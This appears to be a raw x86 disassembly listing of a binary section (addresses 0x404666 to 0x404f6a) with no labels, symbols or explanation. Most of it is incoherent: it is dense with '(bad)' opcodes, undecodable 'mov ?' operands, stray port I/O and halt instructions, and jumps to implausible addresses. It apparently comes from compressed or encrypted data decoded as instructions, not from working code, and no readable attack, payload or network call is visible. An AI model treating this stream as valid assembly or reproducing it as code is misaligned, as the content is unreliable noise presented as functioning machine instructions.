  404666:	add    BYTE PTR [eax],al
  404668:	sbb    DWORD PTR [eax+0xf116aec],edx
  40466e:	add    ch,dh
  404670:	xacquire xchg DWORD PTR [ebp-0x27],edi
  404674:	repz adc bl,BYTE PTR [ecx]
  404677:	outs   dx,BYTE PTR ds:[esi]
  404678:	fptan  
  40467a:	(bad)  
  40467b:	fsub   st(3),st
  40467d:	scas   al,BYTE PTR es:[edi]
  40467e:	fiadd  DWORD PTR [ebx+0x53]
  404681:	pushf  
  404682:	(bad)  
  404683:	fsub   QWORD PTR [ebx+0x52dd759d]
  404689:	adc    cl,BYTE PTR [eax]
  40468b:	push   ecx
  40468c:	out    dx,al
  40468d:	mov    edi,0xc9bd3eff
  404692:	adc    cl,ch
  404694:	enter  0xec8f,0x6a
  404698:	ror    DWORD PTR [esi],1
  40469a:	add    BYTE PTR [ebp-0x12827689],bl
  4046a0:	repz adc dl,BYTE PTR [esi]
  4046a3:	push   ss
  4046a4:	or     edi,esi
  4046a6:	(bad)  
  4046a7:	xchg   esp,eax
  4046a8:	jmp    0x404658
  4046aa:	scas   al,BYTE PTR es:[edi]
  4046ab:	add    BYTE PTR [ebx],dl
  4046ad:	push   0xbc4ffff
  4046b2:	push   DWORD PTR [ebp+0x51]
  4046b5:	jo     0x4046bc
  4046b7:	fisttp DWORD PTR [esi+0x69]
  4046ba:	leave  
  4046bb:	ret    0x83d
  4046be:	push   ebp
  4046bf:	mov    edi,DWORD PTR ds:0x3ef0c485
  4046c5:	dec    DWORD PTR [ebx]
  4046c7:	call   0x3faa9a
	...
  4046dc:	add    BYTE PTR [eax],al
  4046de:	mov    al,ds:0xcc830c4e
  4046e3:	idiv   bh
  4046e5:	jae    0x4046ce
  4046e7:	addr16 jne 0x4046f6
  4046ea:	xor    ebp,ecx
  4046ec:	loop   0x4046ed
  4046ee:	dec    esi
  4046ef:	or     eax,0x761b74c0
  4046f4:	inc    ebp
  4046f5:	lock sub DWORD PTR [eax+0x75],ebp
  4046f9:	or     al,0x71
  4046fb:	and    ebx,0xc00c6eff
  404701:	je     0x40468e
  404703:	cmp    BYTE PTR [ebp-0x4],0xd9
  404707:	pop    es
  404708:	adc    BYTE PTR [eax],al
  40470a:	mov    edx,0x4d75fea7
  40470f:	imul   esi,DWORD PTR [ebp-0x8],0xffe69f41
  404716:	ds or  eax,0x689875c0
  40471c:	jne    0x40472e
  40471e:	cs (bad) 
  404720:	sti    
  404721:	inc    DWORD PTR [edi+edi*2-0x1]
  404725:	jne    0x4046b8
  404727:	outs   dx,DWORD PTR ds:[esi]
  404728:	dec    edi
  404729:	dec    esi
  40472b:	push   0xd7d9458d
  404730:	out    0xe0,eax
  404732:	cli    
  404733:	push   0x7af0ffff
  404738:	psubsb mm1,QWORD PTR [ecx+0x29ffa1ea]
  40473f:	out    dx,eax
  404740:	push   cs
	...
  404751:	add    BYTE PTR [eax],al
  404753:	add    BYTE PTR [ebp+0x2c83af18],ah
  404759:	popf   
  40475a:	mov    eax,ds:0xb105ec75
  40475f:	loop   0x404798
  404761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404762:	mov    eax,DWORD PTR [ebp-0x4]
  404765:	xor    BYTE PTR [edi],bl
  404767:	or     al,0xf0
  404769:	cmp    DWORD PTR [ecx-0x1],ecx
  40476c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40476d:	mov    ecx,0xc4125aab
  404772:	mov    eax,ds:0xd4d1300b
  404777:	mov    WORD PTR [ebp-0x7a00cba3],gs
  40477d:	mov    ecx,0x641311ab
  404782:	mov    eax,ds:0xe4f4b00b
  404787:	and    BYTE PTR [ebp+0x74],0x4
  40478b:	add    BYTE PTR [eax],al
  40478d:	mov    al,0x14
  40478f:	adc    edi,edx
  404791:	fwait
  404792:	repz inc BYTE PTR [ebp+0x1c]
  404796:	mov    eax,ds:0x1711c875
  40479b:	or     al,cl
  40479d:	sbb    esp,DWORD PTR [edx+0x4713b7ff]
  4047a3:	lock inc eax
  4047a5:	cmp    BYTE PTR [edx],ah
  4047a7:	jecxz  0x404750
  4047a9:	xor    DWORD PTR [ecx+0x4947ec75],esp
  4047af:	fst    QWORD PTR [edi-0x33d34bf]
  4047b5:	scas   eax,DWORD PTR es:[edi]
  4047b6:	mov    eax,DWORD PTR ss:[eax]
	...
  4047c9:	add    BYTE PTR [ebp+ebp*1+0x523f0c8],dl
  4047d0:	mov    ebp,0xf106fdff
  4047d5:	stos   DWORD PTR es:[edi],eax
  4047d6:	jns    0x40477d
  4047d8:	push   ds
  4047d9:	mov    eax,ds:0x84e14479
  4047de:	fisttp QWORD PTR [esi]
  4047e0:	jmp    0x7cd9f5fc
  4047e5:	or     ebx,DWORD PTR [eax-0x6c]
  4047e8:	or     BYTE PTR [ecx+0x18290e47],ah
  4047ee:	add    cl,BYTE PTR [esp+eiz*4+0x5c99a093]
  4047f5:	or     al,0x18
  4047f7:	imul   ecx,ebx,0xffffffa0
  4047fa:	daa    
  4047fb:	push   cs
  4047fc:	test   eax,0x4c87d217
  404801:	mov    al,ds:0x3d906f0
  404806:	xor    esi,0xffffffbd
  404809:	push   ss
  40480a:	add    al,0x9a
  40480c:	cmp    al,0x9c
  40480e:	or     dl,bl
  404810:	(bad)  
  404811:	mov    al,ds:0x17a90df7
  404816:	icebp  
  404817:	inc    ebp
  404818:	ins    BYTE PTR es:[edi],dx
  404819:	inc    esi
  40481a:	loopne 0x404852
  40481c:	cmp    ebp,0xa08e99d2
  404822:	pop    ebp
  404823:	setno  BYTE PTR [esp+ebp*4-0x4c738167]
  40482b:	cmp    eax,0xc5a0
	...
  404840:	hlt    
  404841:	push   es
  404842:	adc    al,0x8d
  404844:	les    eax,FWORD PTR [edi-0x6651a8d3]
  40484a:	pop    esi
  40484b:	enter  0x5e6d,0x57
  40484f:	mov    al,ds:0x3e9069f
  404854:	lock lea ebp,[edi+ecx*1+0x6b5c6fb]
  40485c:	jo     0x40483c
  40485e:	(bad)  
  40485f:	call   0xb2294c4a
  404864:	repnz push es
  404866:	add    BYTE PTR [esi],ah
  404868:	push   es
  404869:	or     ebp,eax
  40486b:	dec    eax
  40486c:	cwde   
  40486d:	cdq    
  40486e:	jmp    edx
  404870:	xor    edx,DWORD PTR [ebx]
  404872:	jno    0xe98132b8
  404878:	nop
  404879:	adc    ecx,DWORD PTR [ecx+edx*1]
  40487c:	push   ecx
  40487d:	mov    ecx,0xb8bf6ff
  404882:	push   0x464715
  404887:	out    0x9,al
  404889:	or     ebp,eax
  40488b:	push   cs
  40488c:	dec    esp
  40488d:	cdq    
  40488e:	jmp    DWORD PTR [eax+0x69]
  404891:	pop    esi
  404892:	dec    dh
  404894:	ja     0x4048c4
  404896:	ds call 0x64cd4f8f
  40489c:	xor    bl,BYTE PTR [eax-0x513b4901]
  4048a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048a3:	lea    eax,[eax]
	...
  4048b5:	add    BYTE PTR [edi-0x67],dl
  4048b8:	lea    ebp,[edx+esi*4-0x67]
  4048bc:	call   FWORD PTR [esi+0x51b5981c]
  4048c2:	jle    0x40485c
  4048c4:	inc    DWORD PTR [ecx-0x16ff956d]
  4048ca:	jl     0x40484e
  4048cc:	mov    esp,0x4098677f
  4048d1:	out    0x77,al
  4048d3:	std    
  4048d4:	add    cl,ch
  4048d6:	xrelease mov DWORD PTR [ebp-0x6771d5],edx
  4048dd:	push   esi
  4048de:	repnz idiv bh
  4048e1:	call   0x6ac450d9
  4048e6:	in     al,dx
  4048e7:	push   es
  4048e8:	add    BYTE PTR [eax],al
  4048ea:	add    al,0x45
  4048ec:	sub    al,0x50
  4048ee:	mov    eax,ds:0x89412cce
  4048f3:	ins    BYTE PTR es:[edi],dx
  4048f4:	mov    esp,0xb0489ad
  4048f9:	ror    BYTE PTR [edi+ecx*1+0x459cce9],0x0
  404901:	(bad)  
  404902:	fadd   st(4),st
  404904:	(bad)  
  404905:	jmp    esi
  404907:	jne    0x40494b
  404909:	sub    al,0x69
  40490b:	in     al,dx
  40490c:	retf   
  40490d:	sub    al,0x98
  40490f:	add    al,0xe8
  404911:	lahf   
  404912:	mov    ah,0x2
  404914:	add    BYTE PTR [ebx],cl
  404916:	or     esi,edi
  404918:	add    al,0xe9
	...
  40492a:	add    BYTE PTR [eax],al
  40492c:	xchg   BYTE PTR [eax+eax*1],al
  40492f:	add    BYTE PTR [esi-0x1],al
  404932:	or     ebp,eax
  404934:	inc    esp
  404935:	(bad)  
  404936:	(bad)  
  404937:	call   DWORD PTR [edx]
  404939:	les    esi,FWORD PTR [ebp+0xf]
  40493c:	mov    eax,ds:0x19412858
  404941:	jns    0x4049b8
  404943:	or     al,0x31
  404945:	push   ds
  404946:	(bad)  
  404948:	inc    esi
  404949:	ins    DWORD PTR es:[edi],dx
  40494a:	or     ch,BYTE PTR [edx-0x27]
  40494d:	js     0x4049c4
  40494f:	or     al,0x81
  404951:	mov    edi,ebx
  404953:	inc    DWORD PTR [esi+0x67c29576]
  404959:	js     0x40495a
  40495b:	(bad)  
  40495c:	jmp    0x4048f4
  40495e:	push   ecx
  40495f:	push   eax
  404960:	popa   
  404961:	push   ebp
  404962:	(bad)  
  404964:	inc    esi
  404965:	aam    0xfe
  404967:	jne    0x40490a
  404969:	js     0x4049e0
  40496b:	adc    al,0x16
  40496d:	dec    DWORD PTR [edi]
  40496f:	push   eax
  404970:	inc    esi
  404971:	inc    DWORD PTR [edi]
  404973:	call   0xffdd8768
  404978:	xchg   edi,eax
  404979:	inc    ebp
  40497a:	(bad)  
  40497b:	fisttp DWORD PTR [edi+0x7560aa40]
  404981:	imul   ebp,edi,0xffffff88
  404984:	jne    0x40499f
  404986:	popf   
  404987:	push   DWORD PTR [edi+0x2c]
  40498a:	and    BYTE PTR [eax],dl
  40498c:	lock jp 0x404990
  40498f:	jmp    0x404991
	...
  4049a1:	add    BYTE PTR [edx],al
  4049a3:	stc    
  4049a4:	pop    ss
  4049a5:	adc    BYTE PTR [edi+0x3a],bl
  4049a8:	push   edi
  4049a9:	(bad)  
  4049aa:	push   edi
  4049ab:	or     BYTE PTR [ebx+0x3ad9e42],ch
  4049b1:	or     esi,DWORD PTR [eax]
  4049b3:	adc    eax,esp
  4049b5:	addr16 push ds
  4049b7:	lds    eax,FWORD PTR [eax+eax*1+0x37]
  4049bb:	adc    cl,BYTE PTR [edi]
  4049bd:	call   0xffde0aa6
  4049c2:	daa    
  4049c3:	jb     0x404a1d
  4049c5:	(bad)  
  4049c6:	pop    ds
  4049c7:	mov    al,0x34
  4049c9:	call   0xffddb262
  4049ce:	mov    al,ds:0xf0181f2c
  4049d3:	ror    DWORD PTR [edi],1
  4049d5:	inc    DWORD PTR [ebp+0x7dff33b9]
  4049db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049dc:	pushf  
  4049dd:	push   ebp
  4049de:	or     BYTE PTR [ecx+0x10],bh
  4049e1:	call   FWORD PTR [ebp-0x64]
  4049e4:	xor    edi,edi
  4049e6:	gs test al,0xab
  4049e9:	push   esp
  4049ea:	aad    0x85
  4049ec:	popf   
  4049ed:	call   0xffddb347
  4049f2:	jne    0x404a1f
  4049f4:	ret    0xbffe
  4049f7:	sbb    eax,0xe47dff34
  4049fc:	popf   
  4049fd:	jmp    FWORD PTR [edi+0x54b95107]
  404a03:	pop    es
  404a04:	jmp    0x404a8f
	...
  404a15:	add    BYTE PTR [eax],al
  404a17:	add    BYTE PTR [eax-0x696c93fa],dh
  404a1d:	xchg   esi,eax
  404a1e:	dec    esi
  404a1f:	popf   
  404a20:	inc    ebp
  404a21:	push   ebx
  404a22:	inc    edi
  404a23:	popf   
  404a24:	xchg   DWORD PTR [edi+0x6f0702f],ebx
  404a2a:	ss push edi
  404a2c:	cmp    BYTE PTR [ebp-0x23a762d2],dl
  404a32:	inc    ecx
  404a33:	popf   
  404a34:	shr    BYTE PTR [bp+di],0xf8
  404a38:	pop    edi
  404a39:	cmp    esp,DWORD PTR [edx-0x50]
  404a3c:	retf   0xe06
  404a3f:	pop    ss
  404a40:	in     al,0x95
  404a42:	jl     0x404a37
  404a44:	inc    esi
  404a45:	sbb    al,0xed
  404a47:	pushf  
  404a48:	(bad)  
  404a4b:	fnsave ds:0x32caee96
  404a51:	imul   eax
  404a53:	ss jnp 0x4049f9
  404a56:	ficom  WORD PTR [esi]
  404a58:	in     al,dx
  404a59:	sahf   
  404a5a:	xor    bh,BYTE PTR [ebp-0x3c1d69e9]
  404a60:	test   ah,dh
  404a62:	lds    edx,FWORD PTR [esi]
  404a64:	loopne 0x404a9c
  404a66:	rcl    DWORD PTR [ecx+0x33b6961e],1
  404a6c:	neg    DWORD PTR [ebx]
  404a6e:	rcr    DWORD PTR [ebp+eiz*2+0x5d9d38fb],1
  404a75:	call   DWORD PTR [eax-0x696a20a3]
  404a7b:	stos   DWORD PTR es:[edi],eax
	...
  404a8c:	add    BYTE PTR [eax],al
  404a8e:	retf   0x8eb0
  404a91:	pushf  
  404a92:	mov    ecx,0x1d03ddc8
  404a97:	or     BYTE PTR [ebp-0x4ba64],0x75
  404a9e:	fdivrp st(6),st
  404aa0:	(bad)  
  404aa1:	hlt    
  404aa2:	jmp    DWORD PTR [eax]
  404aa4:	sbb    ah,BYTE PTR [esi-0x2]
  404aa7:	(bad)  
  404aa8:	out    0xa0,eax
  404aaa:	jl     0x404a41
  404aac:	call   DWORD PTR [esi-0x2]
  404aaf:	cli    
  404ab0:	(bad)  
  404ab1:	aam    0x83
  404ab3:	xchg   esp,eax
  404ab4:	jne    0x404aab
  404ab6:	fldl2t 
  404ab8:	(bad)  
  404ab9:	mov    ah,0xeb
  404abb:	sahf   
  404abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404abd:	ss push esp
  404abf:	xchg   ebp,eax
  404ac0:	push   DWORD PTR [edi+eiz*2-0x7b068a6c]
  404ac7:	sbb    ecx,DWORD PTR [ebx+edx*4]
  404aca:	pop    edi
  404acb:	xchg   esp,eax
  404acc:	jne    0x404aaf
  404ace:	mov    edi,DWORD PTR [ecx-0x1]
  404ad1:	push   cs
  404ad2:	ins    BYTE PTR es:[edi],dx
  404ad3:	mov    edi,0x3bf3d9c2
  404ad8:	mov    ecx,DWORD PTR ds:0x9af0ca70
  404ade:	std    
  404adf:	cmp    eax,0x4b78122b
  404ae4:	or     al,0xe6
  404ae6:	cmp    al,0x84
  404ae8:	inc    ebp
  404ae9:	loope  0x404b66
  404aeb:	sbb    ecx,DWORD PTR [eax]
  404aed:	data16 mov cl,0x92
  404af0:	(bad)  
  404af1:	and    al,0x0
	...
  404b03:	add    BYTE PTR [eax+0x6],ah
  404b06:	add    cl,ch
  404b08:	xrelease mov DWORD PTR ds:0x460d2e,edi
  404b0f:	jmp    0x2cc37dfb
  404b14:	cld    
  404b15:	push   es
  404b16:	je     0x404b57
  404b18:	jns    0x404b64
  404b1a:	lock cmp DWORD PTR [esi],ecx
  404b1d:	push   es
  404b1e:	push   0xffffffe9
  404b20:	add    eax,0xc40c8307
  404b25:	xchg   esp,eax
  404b26:	jae    0x404b28
  404b28:	aam    0x71
  404b2a:	jne    0x404b3c
  404b2c:	bound  ecx,QWORD PTR ds:0xaf3006a
  404b32:	lea    eax,[ebp+0x21]
  404b35:	(bad)  
  404b37:	adc    eax,0x40a35e
  404b3c:	mov    ds:0xa2f74c8,al
  404b41:	out    dx,al
  404b42:	repz add BYTE PTR [ebp+0x7d458aa3],ah
  404b49:	test   DWORD PTR [ebp-0x10],ecx
  404b4c:	repnz add dh,BYTE PTR [edi+0x17]
  404b50:	dec    edx
  404b51:	jl     0x404ade
  404b53:	jne    0x404b7a
  404b55:	test   BYTE PTR [ebp+0x8],bh
  404b58:	loop   0x404b97
  404b5a:	lock jecxz 0x404ba8
  404b5d:	jge    0x404b03
  404b5f:	mov    eax,DWORD PTR [esp+ecx*1+0x7fe975ff]
  404b66:	add    bh,bh
	...
  404b78:	add    BYTE PTR [eax],al
  404b7a:	les    eax,FWORD PTR [ebx+0xaa237e8]
  404b80:	add    BYTE PTR [ebx+0x5b5dd00a],cl
  404b86:	ror    ah,1
  404b88:	or     al,0x0
  404b8a:	in     al,0x83
  404b8c:	in     al,dx
  404b8d:	adc    DWORD PTR [ebp+0x7c],0x53
  404b91:	push   esi
  404b92:	(bad)  
  404b93:	loop   0x404c03
  404b95:	das    
  404b96:	fmul   DWORD PTR [edx]
  404b98:	call   0x48ae36
  404b9d:	mov    edx,DWORD PTR [ecx-0x37]
  404ba0:	inc    ebp
  404ba1:	cld    
  404ba2:	or     DWORD PTR [eax],ecx
  404ba4:	add    BYTE PTR [eax],al
  404ba6:	rol    bh,cl
  404ba8:	je     0x404be8
  404baa:	add    esp,edx
  404bac:	cs inc ecx
  404bae:	leave  
  404baf:	fsubr  st(7),st
  404bb1:	inc    ebp
  404bb2:	lock dec eax
  404bb4:	add    eax,DWORD PTR [eax]
  404bb6:	sti    
  404bb7:	pop    ebp
  404bb8:	comiss xmm7,DWORD PTR [ebx+0xd]
  404bbc:	sub    edi,DWORD PTR [edi+ecx*1-0x21]
  404bc0:	add    edx,DWORD PTR [ebx-0x38]
  404bc3:	push   ecx
  404bc4:	outs   dx,BYTE PTR ds:[esi]
  404bc5:	add    al,dh
  404bc7:	test   al,0xc3
  404bc9:	je     0x404bd1
  404bcb:	sbb    DWORD PTR [ebx+0x3332358d],ebx
  404bd1:	call   0x43d4ab
  404bd6:	and    BYTE PTR [ebp-0x4e],al
  404bd9:	add    DWORD PTR ds:0x74034a,0x0
	...
  404bf0:	jmp    0x3a9d:0xf0000485
  404bf7:	pop    esi
  404bf8:	retf   
  404bf9:	out    0xc5,al
  404bfb:	mov    eax,0x39df0
  404c00:	mov    edi,0x33c93e53
  404c05:	push   edx
  404c06:	mov    gs,esp
  404c08:	jae    0x404bf3
  404c0a:	xchg   edx,eax
  404c0b:	add    DWORD PTR ds:0xf040e8dd,0xffffff9d
  404c12:	movlps xmm6,QWORD PTR [ebx+0x5a]
  404c16:	mov    dh,0x2e
  404c18:	mov    cl,0x9d
  404c1a:	add    esi,DWORD PTR [ecx+edi*8+0x20]
  404c1e:	xlat   BYTE PTR ds:[ebx]
  404c1f:	(bad)  
  404c20:	into   
  404c21:	fiadd  WORD PTR [ebx]
  404c23:	add    BYTE PTR [ebp-0xffea45c],bl
  404c29:	popf   
  404c2a:	add    ecx,ecx
  404c2c:	xor    ebx,DWORD PTR [edx]
  404c2e:	aas    
  404c2f:	cli    
  404c30:	ss popf 
  404c32:	add    eax,esi
  404c34:	mov    al,0x9e
  404c36:	add    eax,esi
  404c38:	xor    BYTE PTR [esi+0x730c603],bl
  404c3e:	jmp    0xae03:0xe547b603
  404c45:	inc    edi
  404c46:	in     al,dx
  404c47:	(bad)  
  404c48:	jl     0x404c96
  404c4a:	xchg   ebp,eax
  404c4b:	xor    al,0x5a
  404c4d:	pop    es
  404c4e:	adc    eax,DWORD PTR [edx+ecx*2]
  404c51:	pop    es
  404c52:	adc    eax,DWORD PTR [eax+eax*1]
	...
  404c65:	add    BYTE PTR [edx+0x7],cl
  404c68:	add    eax,DWORD PTR [eax+ebx*1]
  404c6b:	out    0xea,eax
  404c6d:	add    esi,eax
  404c6f:	sbb    al,0x9
  404c71:	repnz and DWORD PTR cs:[ebp+ebx*4-0x37036dc0],0xffffffde
  404c7b:	inc    edi
  404c7c:	jmp    0xeb5cfc8d
  404c81:	retf   0xcab3
  404c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c85:	xchg   ebx,eax
  404c86:	lock push es
  404c88:	jmp    0x398cc990
  404c8d:	xor    al,0x67
  404c8f:	sbb    al,0x1d
  404c91:	cs lock xchg ecx,eax
  404c94:	hlt    
  404c95:	mov    ah,0x6
  404c97:	dec    eax
  404c98:	jmp    0xe65c7ca9
  404c9d:	shr    BYTE PTR [ebp-0xffc166a],0x6
  404ca4:	dec    BYTE PTR [esi]
  404ca6:	cmp    al,0x92
  404ca8:	fdiv   QWORD PTR [eax-0x7316b822]
  404cae:	lods   eax,DWORD PTR ds:[esi]
  404caf:	xchg   esi,eax
  404cb0:	mov    al,0xc4
  404cb2:	lds    edi,FWORD PTR [ebp-0x33]
  404cb5:	test   BYTE PTR [edi+edi*2],ch
  404cb8:	fs ds js 0x404cf3
  404cbc:	inc    ecx
  404cbd:	in     eax,0xd6
  404cbf:	inc    edi
  404cc0:	jmp    0xbee8fe70
  404cc5:	cwde   
  404cc6:	mov    al,ds:0xa8fffd
	...
  404cdb:	add    bh,bh
  404cdd:	or     BYTE PTR [ebx+0x76fa742c],al
  404ce3:	adc    dh,BYTE PTR [edi+0x4b]
  404ce6:	lock cmp DWORD PTR [eax+esi*8-0x740c1656],eax
  404cee:	rcl    BYTE PTR [ecx],0xa
  404cf1:	add    dh,BYTE PTR [esi+0xf36592c]
  404cf7:	aaa    
  404cf8:	not    BYTE PTR [eax+0x4c41e650]
  404cfe:	std    
  404cff:	sbb    ecx,edi
  404d01:	pop    eax
  404d02:	inc    ebp
  404d03:	gs jecxz 0x404d07
  404d06:	mov    dh,0xa4
  404d08:	je     0x404d40
  404d0a:	setg   dh
  404d0d:	mov    WORD PTR [eax-0x22],ss
  404d10:	and    DWORD PTR [ecx+edi*8-0x67],ecx
  404d14:	call   0xc3819271
  404d19:	add    DWORD PTR [edi+0xf3681ac],esi
  404d1f:	jbe    0x404d47
  404d21:	fwait
  404d22:	push   eax
  404d23:	es out dx,al
  404d25:	xchg   esi,eax
  404d26:	push   0x4648d1
  404d2b:	fs push cs
  404d2d:	adc    DWORD PTR [eax+0x1],0xffffff98
  404d31:	pop    esp
  404d32:	add    cl,ch
  404d34:	je     0x404d00
  404d36:	xor    al,0x6c
  404d38:	test   BYTE PTR [edx+0x5fa80150],0x0
  404d3f:	jmp    0x404d44
	...
  404d50:	add    BYTE PTR [eax],al
  404d52:	jecxz  0x404cd7
  404d54:	inc    ebp
  404d55:	jne    0x404d3b
  404d57:	push   ds
  404d58:	and    ecx,DWORD PTR [esi]
  404d5a:	lods   eax,DWORD PTR ds:[esi]
  404d5b:	push   es
  404d5c:	call   0xffd19df9
  404d61:	rol    DWORD PTR [edi+0x3600ffae],0xc3
  404d68:	ret    
  404d69:	push   ebp
  404d6a:	sbb    BYTE PTR [esi-0x7f],0xc4
  404d6e:	cmc    
  404d6f:	ja     0x404d70
  404d71:	dec    DWORD PTR [edx]
  404d73:	loopne 0x404dde
  404d75:	add    BYTE PTR [ebx],al
  404d77:	or     edi,edi
  404d79:	jne    0x404d5c
  404d7b:	pop    esp
  404d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7d:	aad    0x66
  404d7f:	js     0x404d0a
  404d81:	inc    ebp
  404d82:	jne    0x404d67
  404d84:	add    BYTE PTR [eax],al
  404d86:	cmp    di,di
  404d89:	jne    0x404d4c
  404d8b:	pop    esp
  404d8c:	out    0xd4,eax
  404d8e:	es js  0x404df9
  404d91:	pushf  
  404d92:	cdq    
  404d93:	add    al,0x0
  404d95:	lea    ecx,[ebx+ebp*8]
  404d98:	(bad)  
  404d99:	push   DWORD PTR [esi]
  404d9b:	(bad)  
  404d9d:	jnp    0x404d60
  404d9f:	ja     0x404da0
  404da1:	(bad)  
  404da2:	or     al,0xeb
  404da4:	(bad)  
  404da5:	push   DWORD PTR [esi]
  404da7:	sldt   WORD PTR [eax]
  404daa:	mov    DWORD PTR [edi-0x7b],edi
  404dad:	pusha  
  404dae:	es js  0x404db0
  404db1:	push   eax
  404db2:	mov    cl,0x59
  404db4:	test   eax,0x0
	...
  404dc5:	add    BYTE PTR [eax],al
  404dc7:	add    BYTE PTR [ecx-0x63],cl
  404dca:	enter  0x1b2b,0x7e
  404dce:	mov    ebp,0xff77e674
  404dd3:	jmp    0x404e1f
  404dd5:	test   BYTE PTR [edi],bh
  404dd7:	add    BYTE PTR [esi+eax*1+0x44901ba],bh
  404dde:	add    BYTE PTR [ebx],cl
  404de0:	or     esi,edi
  404de2:	add    al,dh
  404de4:	push   cs
  404de5:	add    al,0x47
  404de7:	inc    ecx
  404de8:	mov    BYTE PTR [edx-0x80],dh
  404deb:	add    BYTE PTR [ecx],cl
  404ded:	add    al,0x72
  404def:	in     eax,0xf0
  404df1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404df2:	ret    
  404df3:	je     0x404dd3
  404df5:	inc    ebp
  404df6:	js     0x404df8
  404df8:	lock popf 
  404dfa:	mov    BYTE PTR [ebp-0x69af70],al
  404e00:	inc    eax
  404e01:	pop    ecx
  404e02:	adc    BYTE PTR [eax],cl
  404e04:	fcomp  DWORD PTR [eax]
  404e06:	scas   eax,DWORD PTR es:[edi]
  404e07:	(bad)  
  404e08:	fbstp  TBYTE PTR [edi+eax*1+0x6a]
  404e0c:	lock repz add edi,edi
  404e10:	inc    ebp
  404e11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404e12:	stos   DWORD PTR es:[edi],eax
  404e13:	test   eax,0xe896809c
  404e18:	lods   eax,DWORD PTR ds:[esi]
  404e19:	mov    dl,BYTE PTR [esi+0x101120ff]
  404e1f:	or     BYTE PTR [eax-0x58004ffe],bl
  404e25:	add    eax,0x9df00404
  404e2a:	stos   DWORD PTR es:[edi],eax
  404e2b:	jmp    0x404e30
	...
  404e3c:	add    BYTE PTR [eax],al
  404e3e:	mov    edi,0x75899630
  404e43:	pop    ecx
  404e44:	xchg   esi,eax
  404e45:	inc    DWORD PTR [edi-0xffc693b]
  404e4b:	popf   
  404e4c:	xchg   esi,eax
  404e4d:	mov    ch,0x14
  404e4f:	rcl    DWORD PTR [ebp-0xc642701],1
  404e55:	jmp    DWORD PTR [edi-0x3b]
  404e58:	add    eax,DWORD PTR [eax+esi*8]
  404e5b:	popf   
  404e5c:	stos   DWORD PTR es:[edi],eax
  404e5d:	push   edx
  404e5e:	mov    DWORD PTR [ebp+0x324f5003],ebx
  404e64:	aaa    
  404e65:	inc    DWORD PTR [edi+0x0]
  404e68:	xchg   esi,eax
  404e69:	jne    0x404e53
  404e6b:	cmc    
  404e6c:	and    ah,dl
  404e6e:	aaa    
  404e6f:	nop
  404e70:	sub    bh,bh
  404e72:	repz popf 
  404e74:	add    edi,edi
  404e76:	pop    ebp
  404e77:	adc    DWORD PTR [esi+0x51061fff],0xe9070003
  404e81:	sub    esi,eax
  404e83:	or     ch,cl
  404e85:	add    ebx,DWORD PTR [eax]
  404e87:	fnstsw WORD PTR [edi+0x4]
  404e8a:	lock ss (bad) 
  404e8d:	dec    edi
  404e8e:	xchg   esp,eax
  404e8f:	(bad)  
  404e90:	mov    esi,0xe114ef95
  404e95:	stos   DWORD PTR es:[edi],eax
  404e96:	sub    DWORD PTR [ebx-0x3b376a52],esi
  404e9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e9d:	xchg   ebp,eax
  404e9e:	xlat   BYTE PTR ds:[ebx]
  404e9f:	aaa    
  404ea0:	sahf   
  404ea1:	sldt   WORD PTR [eax]
	...
  404eb4:	clc    
  404eb5:	sahf   
  404eb6:	pushf  
  404eb7:	mov    cl,0xc7
  404eb9:	mov    es,WORD PTR [ecx-0x797141cd]
  404ebf:	xchg   DWORD PTR [ebp+0x2f],ebp
  404ec2:	jle    0x404e59
  404ec4:	scas   eax,DWORD PTR es:[edi]
  404ec5:	aaa    
  404ec6:	add    ecx,esp
  404ec8:	(bad)  
  404ec9:	inc    edi
  404eca:	jmp    0x66e3d47a
  404ecf:	xchg   ebp,eax
  404ed0:	imul   eax,DWORD PTR [ebp+esi*4+0x6a8e8f94],0x4e8e1c57
  404edb:	xchg   ebp,eax
  404edc:	lock adc ch,BYTE PTR [eax+eax*4-0x6ac1d0cb]
  404ee4:	outs   dx,DWORD PTR ds:[esi]
  404ee5:	repz mov edx,0x918472d7
  404eeb:	xchg   esp,eax
  404eec:	pop    edi
  404eed:	mov    gs,ebp
  404eef:	xchg   esp,eax
  404ef0:	popf   
  404ef1:	das    
  404ef2:	push   ds
  404ef3:	xchg   ebp,eax
  404ef4:	dec    edi
  404ef5:	mov    ds,WORD PTR [ebx+ecx*1-0x6ac5a6a8]
  404efc:	aas    
  404efd:	mov    dl,BYTE PTR [esp+edi*1+0x37]
  404f01:	mov    ?,esi
  404f03:	call   FWORD PTR [ecx-0x909ff73]
  404f09:	(bad)  
  404f0a:	out    0x48,eax
  404f0c:	popa   
  404f0d:	mov    ?,edi
  404f0f:	out    0xa6,al
  404f11:	cs (bad) 
  404f13:	fisub  WORD PTR [esi+ecx*4-0x4b]
  404f17:	cmp    eax,0x0
	...
  404f28:	add    BYTE PTR [eax],al
  404f2a:	pop    ebp
  404f2b:	mov    ?,edi
  404f2d:	into   
  404f2e:	out    dx,al
  404f2f:	(bad)  
  404f30:	out    0x8b,eax
  404f32:	inc    eax
  404f33:	mov    ?,edi
  404f35:	shl    bh,cl
  404f37:	and    BYTE PTR [eax],al
  404f39:	inc    ebx
  404f3a:	in     al,dx
  404f3b:	lea    esi,[ebp-0x1f]
  404f3e:	mov    edx,DWORD PTR [ebx-0x2d]
  404f41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f42:	jl     0x404ed1
  404f44:	mov    ch,0x35
  404f46:	gs (bad) 
  404f48:	inc    DWORD PTR [ecx-0x71004b68]
  404f4e:	fs push ebx
  404f50:	pop    esp
  404f51:	xchg   BYTE PTR [ebp+ecx*4-0x18],bl
  404f55:	mov    DWORD PTR [ebp-0x73],ebx
  404f58:	inc    edx
  404f5a:	push   0x32be6f1e
  404f5f:	pop    es
  404f60:	call   0x475b36
  404f65:	jo     0x404f75
  404f67:	(bad)  
  404f69:	push   esi
  404f6a:	pop    esp
